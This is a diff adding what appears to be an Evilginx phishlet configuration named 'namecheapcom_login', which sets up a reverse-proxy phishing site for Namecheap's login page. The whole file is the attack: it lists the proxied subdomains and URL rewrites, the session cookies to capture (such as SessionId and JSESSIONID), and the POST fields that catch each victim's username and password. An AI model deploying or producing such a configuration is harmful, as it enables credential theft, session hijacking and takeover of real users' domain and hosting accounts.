@@ -1,0 +1,52 @@
+name: 'namecheapcom_login'
+author: 'sean@rtlphishletgen'
+min_ver: '3.2.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'namecheap.com', session: true, is_landing: true}
+  - {phish_sub: 'files', orig_sub: 'files', domain: 'namecheap.com', session: true, is_landing: false}
+  - {phish_sub: 'ap.www', orig_sub: 'ap.www', domain: 'namecheap.com', session: true, is_landing: false}
+sub_filters:
+  - {triggers_on: 'www.namecheap.com', orig_sub: 'files', domain: 'namecheap.com', search: 'files.namecheap.com', 
+      replace: 'files.namecheap.com', mimes: [text/html, application/json, application/javascript, text/javascript]}
+  - {triggers_on: 'www.namecheap.com', orig_sub: 'files', domain: 'namecheap.com', search: 'files%2Enamecheap%2Ecom', 
+      replace: 'files%2Enamecheap%2Ecom', mimes: [text/html, application/json, application/javascript, text/javascript]}
+  - {triggers_on: 'www.namecheap.com', orig_sub: 'ap.www', domain: 'namecheap.com', search: 'ap.www.namecheap.com', 
+      replace: 'ap.www.namecheap.com', mimes: [text/html, application/json, application/javascript, text/javascript]}
+  - {triggers_on: 'www.namecheap.com', orig_sub: 'ap.www', domain: 'namecheap.com', search: 'ap%2Ewww%2Enamecheap%2Ecom',
+    replace: 'ap%2Ewww%2Enamecheap%2Ecom', mimes: [text/html, application/json, application/javascript, text/javascript]}
+auth_tokens:
+  - domain: '.namecheap.com'
+    keys:
+      - '_uetsid'
+  - domain: '.www.namecheap.com'
+    keys:
+      - 'SessionId'
+  - domain: '.nr-data.net'
+    keys:
+      - 'JSESSIONID'
+  - domain: '.twitter.com'
+    keys:
+      - 'guest_id'
+  - domain: '.bing.com'
+    keys:
+      - 'MUID'
+credentials:
+  username:
+    key: 'LoginUserName'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'LoginPassword'
+    search: '(.*)'
+    type: 'post'
+auth_urls:
+  - '/myaccount/login/'
+login:
+  domain: 'www.namecheap.com'
+  path: '/myaccount/login/'
+force_post:
+  - path: '/myaccount/login/'
+    search:
+      - {key: 'LoginUserName', search: '(.*)'}
+      - {key: 'LoginPassword', search: '(.*)'}
+    type: 'post'
